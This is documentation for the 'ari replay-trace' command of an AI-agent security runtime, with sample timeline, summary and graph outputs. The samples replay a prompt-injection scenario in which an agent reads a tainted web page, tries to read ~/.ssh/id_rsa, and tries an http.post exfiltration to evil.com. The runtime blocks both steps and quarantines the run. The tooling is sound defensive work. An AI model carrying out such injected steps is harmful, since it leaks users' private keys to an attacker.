# Trace Replay

The `ari replay-trace` command replays a JSON trace file through the AriKernel security runtime and visualizes the results. It supports multiple output modes for different use cases.

## Usage

```bash
ari replay-trace <trace-file> [flags]
```

## Flags

| Flag | Description |
|------|-------------|
| `--timeline` | Show enriched attack timeline with step numbers, taint status, principal, and policy rules |
| `--summary` | Show concise trace summary with event list and run-state counters |
| `--graph` | Show ASCII flowchart of the attack sequence |
| `--json` | Output raw JSON summary (for programmatic consumption) |
| `--verbose` | Show event-by-event comparison between original and replayed decisions |
| `--policy <path>` | Override policy file for what-if analysis |
| `--preset <name>` | Override preset for what-if analysis |

Flags can be combined. For example, `--timeline --graph` shows both views.

## Output Modes

### Default

The default output shows the replay header, any mismatches, and a summary of decisions (allowed, denied, quarantined) with a determinism check.

### Timeline (`--timeline`)

Shows each event in chronological order with:
- **Relative timestamp** from run start
- **Step number** (`#0`, `#1`, ...)
- **Decision** (ALLOWED / DENIED / BLOCKED)
- **Tool call** (`http.get`, `file.read`, etc.) and target
- **Taint status** (e.g., `taint:[web]`)
- **Principal** that initiated the call
- **Policy rule** that matched

Example:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ARI KERNEL  ATTACK TIMELINE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Scenario: Prompt injection: web taint → sensitive read → exfiltration attempt

  0.031s  #0  ✓ ALLOWED  http.get https://httpbin.org/html
                            taint:[web]  principal:agent  rule:allow-http-get

  0.243s  #1  ✗ DENIED   file.read ~/.ssh/id_rsa
                            Grant constraint violation: path not in allowed paths
                            principal:agent

  0.245s  #2  ✗ BLOCKED  http.post https://evil.com/exfil
                            Run entered restricted mode. 'http.post' is blocked.
                            principal:agent

  0.245s       🔒 QUARANTINE ACTIVATED
                            Run locked to read-only after behavioral rule match

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Result: ATTACK CONTAINED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Summary (`--summary`)

Shows a compact overview including:
- Scenario metadata (description, principal, preset, duration)
- Numbered event list with verdict and taint markers
- Final run-state counters (denied actions, egress attempts, etc.)
- Aggregate verdict

Example:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TRACE SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Scenario:  Prompt injection: web taint → sensitive read → exfiltration
  Preset:    safe-research
  Duration:  245ms

  Events:
    1. http.get https://httpbin.org/html → ALLOW [tainted]
    2. file.read ~/.ssh/id_rsa → DENY
    3. http.post https://evil.com/exfil → DENY

  Counters:
    Denied actions:          2
    Capability requests:     3
    Denied capabilities:     1
    Egress attempts:         0
    Sensitive file reads:    1

  Verdict:  1 allowed, 2 denied, quarantined
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Graph (`--graph`)

Shows an ASCII flowchart of the attack sequence:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ATTACK SEQUENCE GRAPH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  #0  [ALLOW  ]  http.get https://httpbin.org/html
             │
             └──►
  #1  [DENY   ]  file.read ~/.ssh/id_rsa
             │
             └──►
  #2  [DENY   ]  http.post https://evil.com/exfil
             │
       🔒 QUARANTINE  run locked to read-only

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### JSON (`--json`)

Outputs the replay summary as JSON for piping into other tools:

```bash
ari replay-trace trace.json --json | jq '.denied'
```

## Trace File Format

The trace file is a JSON file conforming to `ReplayTrace` (version `1.0`). See [packages/runtime/src/trace-types.ts](../packages/runtime/src/trace-types.ts) for the full schema.

Key fields:
- `events[]` — ordered tool call attempts with decisions
- `quarantines[]` — quarantine transitions
- `outcome` — aggregate statistics
- `metadata` — principal, preset, description

Traces are generated automatically during kernel-protected runs or via the `TraceRecorder` API.

## What-If Analysis

Use `--policy` or `--preset` to replay a trace under different security rules:

```bash
# Would a stricter policy have caught the attack earlier?
ari replay-trace trace.json --preset strict --timeline

# Test a custom policy against a known attack
ari replay-trace trace.json --policy ./my-policy.yaml --summary
```

The replay engine re-evaluates every decision deterministically. Mismatches between original and replayed decisions are highlighted.
